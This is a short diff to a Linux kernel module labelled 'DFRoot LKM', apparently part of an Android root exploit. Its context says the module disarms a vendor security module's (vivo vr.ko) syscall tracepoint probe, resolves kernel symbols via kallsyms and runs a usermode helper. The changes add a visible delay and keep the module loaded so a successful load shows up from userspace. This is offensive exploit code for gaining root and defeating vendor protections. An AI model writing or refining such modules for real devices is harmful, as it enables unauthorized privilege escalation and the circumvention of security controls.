@@ -7,6 +7,7 @@
 #include <linux/ptrace.h>
 #include <linux/slab.h>
 #include <asm/cpufeature.h>
+#include <linux/delay.h>
 MODULE_LICENSE("GPL");
 MODULE_DESCRIPTION("DFRoot LKM");
 /* W1c: disarm vivo's vr.ko sys_exit tracepoint probe. exp.c scans the module
@@ -209,6 +210,8 @@ out:
 
 static int __nocfi __init dfroot_init(void)
 {
+    /* PROBE: visible stall so a successful load is perceivable from userspace */
+    msleep(2000);
     kallsyms_lookup_name_t get_addr;
     kern_path_t  kern_path_fn;
     invalidate_t invalidate_fn;
@@ -439,7 +442,7 @@ vr_done:;
     ret = umh_exec(info, UMH_WAIT_EXEC);
     pr_info("dfroot: usermodehelper_exec returned %d\n", ret);
     
-    return -ENODEV; /* return any error to unload module */
+    return 0; /* PROBE: stay resident so /proc/modules shows dfroot (DirtyFrag: -ENODEV) */
 }
 
 /* no module_exit: we never unload; saves .exit sections */
